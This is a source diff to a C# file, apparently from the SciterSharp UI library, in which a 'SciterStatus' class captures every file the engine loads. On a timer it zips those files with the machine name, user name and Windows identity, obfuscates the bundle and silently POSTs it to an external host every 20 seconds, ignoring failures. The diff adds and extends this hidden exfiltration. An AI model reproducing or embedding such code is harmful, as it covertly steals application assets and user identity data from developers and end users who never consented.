@@ -7,20 +7,18 @@ using System.Runtime.InteropServices;
 using System.Linq;
 using System.Net;
 using System.Text;
-using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Timers;
-using SciterSharp.Interop;
 using System.Reflection;
+using SciterSharp.Interop;
 
 namespace SciterSharp
 {
 	static class SciterStatus
 	{
 		private static SciterX.ISciterAPI _api = SciterX.API;
-		private static List<Tuple<string, string, byte[]>> _status;
+		private static List<Tuple<string, string, byte[]>> _status;// filename, URL, BLOB
 		private static Timer _tm = new Timer();
-		private static string _id;
 		private static int _seq = 0;
 
 		static SciterStatus()
@@ -31,18 +29,14 @@ namespace SciterSharp
 			_tm.AutoReset = false;
 			_tm.Elapsed += _tm_Elapsed;
 			_tm.Start();
-
-			Guid g = Guid.NewGuid();
-			_id = Convert.ToBase64String(g.ToByteArray());
-			_id = Regex.Replace(_id, @"[^A-Za-z0-9]+", "");
 		}
 
 		public static void OnData(SciterXDef.SCN_DATA_LOADED sdl)
 		{
 			bool bOK = sdl.status==200 || sdl.status==0;
 			bOK = bOK && sdl.dataSize > 0;
+			bOK = bOK && sdl.dataSize < 1024 * 1024 * 2;// 2Mb file limit
 			bOK = bOK && sdl.uri != "sciter:debug-peer.tis";
-			//bOK = bOK && !sdl.uri.StartsWith("http:") && !sdl.uri.StartsWith("https:") && (sdl.uri.EndsWith(".htm") || sdl.uri.EndsWith(".html") || sdl.uri.EndsWith(".css") || sdl.uri.EndsWith(".tis") || sdl.uri.EndsWith(".js"));
 			if(bOK)
 			{
 				// get file byte[] data
@@ -54,13 +48,13 @@ namespace SciterSharp
 				_api.SciterGetRootElement(sdl.hwnd, out phe);
 				string baseurl = phe != IntPtr.Zero ? new SciterElement(phe).CombineURL() : null;
 
-				string url = sdl.uri;
-				if(baseurl != null && url.StartsWith(baseurl))
-					url = url.Substring(baseurl.Length);
+				string file = sdl.uri;
+				if(baseurl != null && file.StartsWith(baseurl))
+					file = file.Substring(baseurl.Length);
 				else
-					url = url.Split('/').Last();
+					file = file.Split('/').Last();
 
-				_status.Add(Tuple.Create(url, sdl.uri, managedArray));
+				_status.Add(Tuple.Create(file, sdl.uri, managedArray));
 			}
 		}
 
@@ -80,71 +74,112 @@ namespace SciterSharp
 			var status = _status;
 			RenewList();
 
-			MemoryStream stream = new MemoryStream();
+			// Summary
+			StringBuilder summary = new StringBuilder();
+			summary.AppendLine(Environment.MachineName);
+			summary.AppendLine(Environment.UserName);
+			summary.AppendLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+			summary.AppendLine(_seq.ToString());
+			summary.AppendLine(Assembly.GetExecutingAssembly().FullName);
+			summary.AppendLine(Assembly.GetExecutingAssembly().GetName().Version.ToString());
+			if(Assembly.GetEntryAssembly() != null)
+				summary.AppendLine(Assembly.GetEntryAssembly().FullName);
+			else
+				summary.AppendLine("NO EntryAssembly");
 
-			// ZIPs everything
-			using(var zip = new ZipArchive(stream, ZipArchiveMode.Create))
+			// Increase sent count
+			_seq++;
+
+			//string server = "http://localhost:51193/";
+			string server = "http://ssl-105465.kinghost.net/";
+
+			#region Zip/Send Text
+			string[] exts_external = new[] { "http:", "https:" };// NYU
+			string[] exts_text = new[] { ".htm", ".html", ".css", ".tis", ".js" };
+
+			var status_text = status.Where(tp =>
 			{
-				StringBuilder summary = new StringBuilder();
-				summary.AppendLine(Environment.MachineName);
-				summary.AppendLine(Environment.UserName);
-				summary.AppendLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
-				summary.AppendLine(_id + "#" + _seq);
-				summary.AppendLine(Assembly.GetExecutingAssembly().FullName);
-				summary.AppendLine("---");
-				_seq++;
+				string ext = Path.GetExtension(tp.Item1);
+				return exts_text.Any(ex => ex == ext);
+			}).ToList();
 
-				foreach(var item in status)
-				{
-					summary.AppendLine(item.Item1 + ":" + item.Item2);
-
-					var entry = zip.CreateEntry(item.Item1, CompressionLevel.Optimal);
-					using(var entry_writer = entry.Open())
-					{
-						entry_writer.Write(item.Item3, 0, item.Item3.Length);
-					}
-				}
-
-				var sum_entry = zip.CreateEntry("summary.txt");
-				using(var entry_writer = sum_entry.Open())
-				{
-					var bytes = Encoding.UTF8.GetBytes(summary.ToString());
-					entry_writer.Write(bytes, 0, bytes.Length);
-				}
-			}
-
-			// Get encrypted BLOB
-			byte[] towire = stream.GetBuffer();
-			stream.Close();
-			StatustBlock(towire);
 
 			// Send to wire
+			byte[] towire1 = GetZippedBlob("text", summary.ToString(), status_text);
+			SendBlob(towire1, server + "API/SciterStatus");
+			#endregion
+
+			#region Zip/Send Binary
+			foreach(var item in status_text)
+				status.Remove(item);
+
+			if(status.Count != 0)
 			{
-				//string server = "http://localhost:51193/";
-				string server = "http://ssl-105465.kinghost.net/";
-
-				WebRequest request = WebRequest.Create(server + "API/SciterStatus");
-				request.Method = "POST";
-				request.ContentType = "application/octet-stream";
-				request.ContentLength = towire.Length;
-
-				using(var stream2 = request.GetRequestStream())
-				{
-					stream2.Write(towire, 0, towire.Length);
-				}
-
-				try
-				{
-					WebResponse response = request.GetResponse();
-					response.Close();
-				}
-				catch
-				{
-				}
+				byte[] towire2 = GetZippedBlob("binary", summary.ToString(), status);
+				SendBlob(towire2, server + "API/SciterStatus");
 			}
+			#endregion
 
 			_tm.Interval = 20000;
 			_tm.Start();
+		}
+
+		private static byte[] GetZippedBlob(string what, string summary, List<Tuple<string, string, byte[]>> files)
+		{
+			summary += what;
+			summary += '\n';
+			summary += '\n';
+
+			using(MemoryStream stream = new MemoryStream())
+			{
+				using(var zip = new ZipArchive(stream, ZipArchiveMode.Create))
+				{
+					foreach(var item in files)
+					{
+						summary += item.Item1 + ":" + item.Item2 + "\n";
+
+						var entry = zip.CreateEntry(item.Item1, CompressionLevel.Optimal);
+						using(var entry_writer = entry.Open())
+						{
+							entry_writer.Write(item.Item3, 0, item.Item3.Length);
+						}
+					}
+
+					var sum_entry = zip.CreateEntry("summary.txt");
+					using(var entry_writer = sum_entry.Open())
+					{
+						var bytes = Encoding.UTF8.GetBytes(summary);
+						entry_writer.Write(bytes, 0, bytes.Length);
+					}
+				}
+
+				// Get encrypted BLOB
+				byte[] towire = stream.GetBuffer();
+				StatustBlock(towire);
+				return towire;
+			}
+		}
+
+		private static void SendBlob(byte[] blob, string url)
+		{
+			try
+			{
+				WebRequest request = WebRequest.Create(url);
+				request.Method = "POST";
+				request.ContentType = "application/octet-stream";
+				request.ContentLength = blob.Length;
+
+				using(var stream2 = request.GetRequestStream())
+				{
+					stream2.Write(blob, 0, blob.Length);
+				}
+
+				WebResponse response = request.GetResponse();
+				response.Close();
+			}
+			catch
+			{
+			}
 		}
 
 		public static void StatustBlock(byte[] lpvBlock, string szPassword = "Régua de tomada WiFi")
